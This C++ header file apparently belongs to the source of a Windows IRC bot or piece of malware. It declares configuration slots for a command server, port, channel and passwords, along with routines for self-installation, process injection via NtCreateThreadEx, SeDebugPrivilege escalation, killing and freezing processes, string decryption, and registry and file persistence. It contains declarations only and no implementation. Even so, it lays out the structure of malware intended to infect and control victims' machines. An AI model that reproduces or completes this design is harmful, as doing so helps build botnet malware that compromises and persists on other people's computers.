#ifndef CORE_HPP
#define CORE_HPP

#include "../Includes/includes.hpp"
#include "../resource.h"

struct INSIDE {
	API::zCloseHandle				CloseHandle;
	API::zRegOpenKeyEx				RegOpenKeyEx;
	API::zRegCloseKey				RegCloseKey;
	API::zRegDeleteKey				RegDeleteKey;
	API::zCreateToolhelp32Snapshot	CreateToolhelp32Snapshot;
	API::zProcess32First			Process32First;
	API::zProcess32Next				Process32Next;
	API::zShellExecute				ShellExecuteA;
	API::zLstrcmp					lstrcmp;
	API::zSleep						Sleep;
	API::PROCESSENTRY32				pe32;

	char final[MAX_PATH];
	char directory[MAX_PATH];
	char exefile[15];
	char open[5];
	char key[MAX_PATH];
};

typedef enum {
	CFG_SVHOST = 1,
	CFG_SVPORT,
	CFG_SVPW,
	CFG_CHAN,
	CFG_CHANPW,
	CFG_HOST,
	CFG_REG,
	CFG_MTX,
	CFG_RET
} cfg_parms;

DWORD __stdcall Retainer( INSIDE *api );
void __declspec() ProcEnd_Retainer( void );

bool	Install						( API *api, string filename, string directory );
bool	InjectSister				( API *api );
int		ActivateSeDebugPrivilege	( API *api );
int		GetPID						( API *api, string processname );
bool	dumpFile					( API *api, string directory, string filename );
//bool	TerminateProc				( API *api, string processname );
//bool	TerminateProc				( API* api, string processname, string path = "");
bool TerminateProc(API* api, char* processname, const char *path );
bool	FreezeProcess				(API *api, DWORD dwOwnerPID, bool Freeze);
int RetrieveSetting(cfg_parms param, ...);
void decode(char *src, char *dest);
std::string decrypt(const char* ePtr);
inline char value(char c);
std::string GenerateNumber(int Len);
int GetOS( API* api );

typedef BOOL		(__stdcall *LPFN_ISWOW64PROCESS)			( HANDLE, PBOOL);
typedef long (WINAPI *LPFUN_NtCreateThreadEx) (PHANDLE hThread,ACCESS_MASK DesiredAccess,LPVOID ObjectAttributes, HANDLE ProcessHandle,LPTHREAD_START_ROUTINE lpStartAddress,LPVOID lpParameter,BOOL CreateSuspended,ULONG StackZeroBits,ULONG SizeOfStackCommit,ULONG SizeOfStackReserve,LPVOID lpBytesBuffer);
struct NtCreateThreadExBuffer {
	ULONG Size;
	ULONG Unknown1;
	ULONG Unknown2;
	PULONG Unknown3;
	ULONG Unknown4;
	ULONG Unknown5;
	ULONG Unknown6;
	PULONG Unknown7;
	ULONG Unknown8;
};

DWORD __stdcall RegistryPersistence	( API *api );
DWORD __stdcall FilePersistence		( API *api );

#endif